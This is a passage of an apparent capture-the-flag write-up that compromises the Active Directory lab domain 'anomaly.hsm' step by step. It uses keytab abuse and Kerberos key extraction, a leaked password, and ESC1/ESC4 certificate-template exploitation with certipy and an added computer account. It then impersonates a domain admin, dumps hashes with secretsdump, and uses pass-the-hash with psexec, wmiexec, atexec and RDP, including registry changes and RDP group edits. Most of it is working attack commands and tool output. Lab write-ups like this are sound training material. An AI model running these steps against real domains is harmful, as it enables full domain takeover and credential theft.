*   Because `kinit` is present on the system, you can use that keytab to "log in" as Brandon Boyd and get a Kerberos Ticket Granting Ticket (TGT). _**To impersonate him, run this command:**_

    ```bash
    #Authenticate using the keytab
    kinit -k -t /etc/krb5.keytab Brandon_Boyd@ANOMALY.HSM
    #Verify a valid Kerberos TGT
    klist

    #Try
    smbclient -k //Anomaly-DC/anomaly.hsm

    #Try Kerberos admin access
    kadmin -k -t /etc/krb5.keytab -p Brandon_Boyd@ANOMALY.HSM
    ```

    ![image.png](<../.gitbook/assets/image 23 (4).png>)

    * obtained a valid **Ticket Granting Ticket (TGT)** for `Brandon_Boyd` stored in `/tmp/krb5cc_111`

#### E**xtracting Kerberos keys (hash material)** from a keytab file

https://github.com/sosdave/KeyTabExtract

```bash
python3 keytabextract.py /etc/krb5.keytab
```

![image.png](<../.gitbook/assets/image 24 (4).png>)

_**Using the AES key**_

```bash
nxc smb Anomaly-DC.anomaly.hsm -u Brandon_Boyd --aesKey f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52

nxc smb Anomaly-DC.anomaly.hsm -u Brandon_Boyd --aesKey f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52 --shares
```

![image.png](<../.gitbook/assets/image 25 (4).png>)

* We did not go any further
* need to transfer `/tmp/krb5cc_111` to our VM

```bash
#Jenkins
 python3 -m http.server 8002
 
#Vm
wget http://10.1.107.2:8002/krb5cc_111

Then
export KRB5CCNAME=krb5cc_111
klist
```

![image.png](<../.gitbook/assets/image 26 (4).png>)

### Bloodhound -Collecting loot

```bash
bloodhound-python -k -no-pass -u Brandon_Boyd -d anomaly.hsm -dc Anomaly-DC.anomaly.hsm -ns 10.1.69.52 -c all
```

![image.png](<../.gitbook/assets/image 27 (3).png>)

#### Bloodhound Enumeration

![image.png](<../.gitbook/assets/image 28 (3).png>)

* `Anna_Molly` is in All domain admins

![image.png](<../.gitbook/assets/image 29 (3).png>)

* Not much of an interest with `bradon_boyd` here
* Performing further enumeration

```bash
nxc smb anomaly.hsm -u Brandon_Boyd -d ANOMALY.HSM -k --users
```

![image.png](<../.gitbook/assets/image 30 (4).png>)

* Obtained a clear password `3edc4rfv#EDC$RFV` from the description
*   A user `anna_molly` is also present

    ```bash
    nxc smb anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV'
    ```

    ![image.png](<../.gitbook/assets/image 31 (3).png>)

#### Checking for quick wins

```bash
nxc smb anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' --rid-brute | grep 'SidTypeUser' 
nxc ldap anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M pre2k
nxc ldap anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M adcs
nxc ldap anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M adcs --port 389
nxc smb anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M zerologon
nxc smb  anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M gpp_autologin
```

![image.png](<../.gitbook/assets/image 32 (3).png>)

* **Active Directory Certificate Services (ADCS)** is running on the Domain Controller.

```bash
certipy-ad find -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -dc-ip 10.1.69.52 -vulnerable -stdout
```

```bash
RedBlue@Frank Anomaly % certipy-ad find -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -dc-ip 10.1.69.52 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'anomaly-ANOMALY-DC-CA-2' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'anomaly-ANOMALY-DC-CA-2'
[*] Checking web enrollment for CA 'anomaly-ANOMALY-DC-CA-2' @ 'Anomaly-DC.anomaly.hsm'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : anomaly-ANOMALY-DC-CA-2
    DNS Name                            : Anomaly-DC.anomaly.hsm
    Certificate Subject                 : CN=anomaly-ANOMALY-DC-CA-2, DC=anomaly, DC=hsm
    Certificate Serial Number           : 3F1A258E7CADC7AE4C54650883521D22
    Certificate Validity Start          : 2025-09-21 21:25:39+00:00
    Certificate Validity End            : 2124-09-21 21:35:38+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : ANOMALY.HSM\Administrators
      Access Rights
        ManageCa                        : ANOMALY.HSM\Administrators
                                          ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
        ManageCertificates              : ANOMALY.HSM\Administrators
                                          ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
        Enroll                          : ANOMALY.HSM\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertAdmin
    Display Name                        : CertAdmin
    Certificate Authorities             : anomaly-ANOMALY-DC-CA-2
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 650430 hours
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-21T17:57:59+00:00
    Template Last Modified              : 2025-09-21T17:58:00+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
      Object Control Permissions
        Owner                           : ANOMALY.HSM\Administrator
        Full Control Principals         : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
                                          ANOMALY.HSM\Domain Computers
        Write Owner Principals          : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
                                          ANOMALY.HSM\Domain Computers
        Write Dacl Principals           : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
                                          ANOMALY.HSM\Domain Computers
        Write Property Enroll           : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
    [+] User Enrollable Principals      : ANOMALY.HSM\Domain Computers
    [+] User ACL Principals             : ANOMALY.HSM\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
RedBlue@Frank Anomaly % 

```

* User is vulnerable to **ESC1: Enrollee-Supplied Subject for Client Authentication** & ESC4
* We can target user `Anna_Molly` as they are in All Admin Domain

#### _**Exploiting an ESC1 vulnerability**_

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

_**Request the certificate for the target user**_

```bash
certipy req \
    -u 'Brandon_Boyd@anomaly.hsm' -p '3edc4rfv#EDC$RFV' \
    -dc-ip '10.1.69.52' -target 'Anomaly-DC.anomaly.hsm' \
    -ca 'anomaly-ANOMALY-DC-CA-2' -template 'CertAdmin' \
    -upn 'anna_molly@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'
    
    
 #SID   
 certipy account -u 'Brandon_Boyd' -p '3edc4rfv#EDC$RFV' -dc-ip '10.1.69.52' -user 'anna_molly' read
```

![image.png](<../.gitbook/assets/image 33 (3).png>)

```bash
RedBlue@Frank Anomaly %  certipy-ad account -u 'Brandon_Boyd' -p '3edc4rfv#EDC$RFV' -dc-ip '10.1.69.52' -user 'anna_molly' read                 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'anna_molly':
    cn                                  : anna_molly
    distinguishedName                   : CN=anna_molly,CN=Users,DC=anomaly,DC=hsm
    name                                : anna_molly
    objectSid                           : S-1-5-21-1496966362-3320961333-4044918980-1105
    sAMAccountName                      : anna_molly
    userAccountControl                  : 66048
    whenCreated                         : 2025-09-21T12:22:31+00:00
    whenChanged                         : 2025-11-12T20:29:25+00:00
RedBlue@Frank Anomaly % 

```

_**Authenticate using the obtained certificate**_

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

![image.png](<../.gitbook/assets/image 34 (2).png>)

*   **cannot enroll directly** as `Brandon_Boyd`

    ```bash
        [+] User Enrollable Principals      : ANOMALY.HSM\Domain Computers
        [+] User ACL Principals             : ANOMALY.HSM\Domain Computers
        [!] Vulnerabilities
          ESC1                              : Enrollee supplies subject and template allows client authentication.
          ESC4                              : User has dangerous permissions.
    RedBlue@Frank Anomaly % 
    ```

    * This piece of information , tells us that we **can’t request a cert directly**
    *   BUT **can modify the template via a computer account**

        _**Create a computer account**_

        ```bash
        impacket-addcomputer anomaly.hsm/Brandon_Boyd:'3edc4rfv#EDC$RFV' \
        -dc-ip 10.1.69.52 \
        -computer-name REDBLUE$ \
        -computer-pass RedBlue777
        ```

        ![image.png](<../.gitbook/assets/image 35 (2).png>)

        _Requesting the certificate with the computer account_

        ```bash
        certipy-ad req \
        -u 'REDBLUE$@anomaly.hsm' -p 'RedBlue777' \
        -dc-ip 10.1.69.52 \
        -target ANOMALY-DC.anomaly.hsm \
        -ca 'anomaly-ANOMALY-DC-CA-2' \
        -template CertAdmin \
        -upn 'anna_molly@anomaly.hsm'

        ```

        ![image.png](<../.gitbook/assets/image 36 (2).png>)

        * This trick failed and we might want to use the computer account to grant Brandon\_Boyd permission to unlock the template

        _**Abuse ESC4 (modify template)- Abuse ESC4 (Granting Permissions)**_

        Since `REDBLUE$` has dangerous permissions over the template (ESC4), use it to grant **Enrollment** rights to your user account.

        **Grant Brandon\_Boyd permission to use the template:**

        _**Save the Template Configuration**_

        ```bash
        certipy-ad template \
        -u 'REDBLUE$@anomaly.hsm' -p 'RedBlue777' \
        -dc-ip 10.1.69.52 \
        -template CertAdmin \
        -save-configuration CertAdmin.conf
        ```

        ![image.png](<../.gitbook/assets/image 37 (2).png>)

        _**Edit the Configuration File**_

        Open `CertAdmin.conf` and Look for the section labeled **`permissions`** and specifically the **`enrollment_permissions`** list.

        Add **`ANOMALY.HSM\Brandon_Boyd`** to that list.

        ![image.png](<../.gitbook/assets/image 38 (2).png>)

        * Editing the `nTSecurityDescriptor` in hex manually is a nightmare because it’s a binary structure
        * Pushing the changes now wont work

        _**Push the Changes to the Domain Controller**_

        ```bash
        certipy-ad template \
        -u 'REDBLUE$@anomaly.hsm' -p 'RedBlue777' \
        -dc-ip 10.1.69.52 \
        -template CertAdmin \
        -write-configuration CertAdmin.conf
        ```

        _**Trying Using Impacket to Grant Full Control**_

        ```bash
        python3 /usr/share/doc/python3-impacket/examples/dacledit.py \
        -action 'write' \
        -rights 'FullControl' \
        -principal 'Brandon_Boyd' \
        -target-dn 'CN=CertAdmin,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=anomaly,DC=hsm' \
        -dc-ip 10.1.69.52 \
        -use-ldaps \
        'anomaly.hsm/REDBLUE$:RedBlue777'

        ```

        ![image.png](<../.gitbook/assets/image 39 (2).png>)

        _**Perform the ESC1 Attack as Brandon**_

        ```bash
        certipy-ad req \
        -u 'Brandon_Boyd@anomaly.hsm' -p '3edc4rfv#EDC$RFV' \
        -dc-ip 10.1.69.52 \
        -dc-host Anomaly-DC.anomaly.hsm \
        -target Anomaly-DC.anomaly.hsm \
        -ca 'anomaly-ANOMALY-DC-CA-2' \
        -template CertAdmin \
        -upn 'anna_molly@anomaly.hsm' \
        -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105' \
        -debug
        ```

        ![image.png](<../.gitbook/assets/image 40 (2).png>)

        ### Authenticate as `anna_molly`

        ```bash
        certipy-ad auth -pfx 'anna_molly.pfx' -dc-ip '10.1.69.52'
        ```

        ![image.png](<../.gitbook/assets/image 41 (1).png>)

        ```bash
        evil-winrm -i 10.1.69.52 -u 'anna_molly' -H 'be4bf3131851aee9a424c58e02879f6e'

        Get-ChildItem -Path C:\ -Include '*root.txt' -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "=== $($_.FullName) ==="; Get-Content -Raw -Encoding UTF8 $_.FullName }
        ```

        ![image.png](<../.gitbook/assets/image 42 (1).png>)

        * Tried evil-winrm but then the port was not open !!!!!!!!
        * IT SAVES TIME TO READ SOMETIMES HHAHAHAHA!!!!

        Interactive shell

        ```bash
        impacket-psexec 'anomaly.hsm/anna_molly@10.1.69.52' -hashes ':be4bf3131851aee9a424c58e02879f6e'
        ```

        ![image.png](<../.gitbook/assets/image 43 (1).png>)

        * Not successful this time

#### Check Administrative Access

```bash
nxc smb 10.1.69.52 -u 'anna_molly' -H 'be4bf3131851aee9a424c58e02879f6e'
```

![image.png](<../.gitbook/assets/image 44 (2).png>)

#### Domain Admin (Secretsdump)

```bash
impacket-secretsdump -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52'
```

![image.png](<../.gitbook/assets/image 45 (2).png>)

```bash
Local Administrator Hash: 31592a42841d0a9e74f93c41d8884cd0
```

### Using `xfreerdp`

```bash
xfreerdp3 /v:10.1.69.52 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 +clipboard /dynamic-resolution /drive:$(pwd),share

xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f93c41d8884cd0 /cert:ignore +clipboard /dynamic-resolution /drive:$(pwd),share

xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f93c41d8884cd0 /cert:ignore /restricted-admin /sec:tls /dynamic-resolution +clipboard
```

![image.png](<../.gitbook/assets/image 46 (2).png>)

* `HYBRID_REQUIRED_BY_SERVER` is the definitive sign that **NLA (Network Level Authentication)** is strictly enforced on the Domain Controller. In this state, the server refuses to even negotiate a TLS connection unless it can verify your identity first.
*   Since we are using a hash, we need to enable **`Restricted Admin Mode`** on the target. This allows NLA to complete using NTLM (your hash) instead of a password.

    ```bash
    impacket-wmiexec -hashes ':31592a42841d0a9e74f93c41d8884cd0' 'Administrator@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
    ```

    ![image.png](<../.gitbook/assets/image 47 (2).png>)

    * **local** `Administrator` account (RID 500) is either disabled or restricted from network logons
    *   Since we know `anna_molly` has the rights to start services and read the registry (proven by `secretsdump`), we shall use it to enable **Restricted Admin Mode** for the whole system

        ```bash
        impacket-wmiexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

        OR

        impacket-smbexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52'

        #Run the Registry command manually
        reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

        #Verify the Registry Key Run this to see if the value is now 0x0
        reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

        OR

        impacket-psexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

        xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
        ```

        ![image.png](<../.gitbook/assets/image 48 (2).png>)

        * `psexec` successfully **uploaded** the binary, **created** the service, and **started** it. The "Error performing uninstallation" simply means the RPC connection died before the service could report its final exit code back to your Kali machine.

    _**Run the RDP command as\*\*\*\*****&#x20;****`anna_molly`****:**_

    ```bash
    xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
    ```

    ![image.png](<../.gitbook/assets/image 49 (2).png>)

    * **"Account restrictions are preventing this user from signing in"** is the classic symptom of a successful connection where **Restricted Admin Mode** is still technically disabled or being blocked by a local policy

_**Use\*\*\*\*****&#x20;****`atexec`****&#x20;****\*\*\*\*(The Task Scheduler)**_

`atexec` is often more reliable in high-latency environments because it creates a scheduled task, runs it, and then retrieves the output. It doesn't rely on a persistent service connection like `psexec`.

```bash
impacket-atexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
```

![image.png](<../.gitbook/assets/image 50 (1).png>)

_**Add\*\*\*\*****&#x20;****`anna_molly`****&#x20;****\*\*\*\*to the RDP Group**_

Even as an Admin, sometimes Server 2025 requires explicit group membership for NLA to pass through `/restricted-admin`. Run this immediately after.

```bash
impacket-atexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52' "net localgroup \"Remote Desktop Users\" anna_molly /add"
```

```bash
xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
```

![image.png](<../.gitbook/assets/image 51 (1).png>)

#### BOOM ROOOOOOOOOOOOOOOOOOT!!!!!

![image.png](<../.gitbook/assets/image 52 (1).png>)
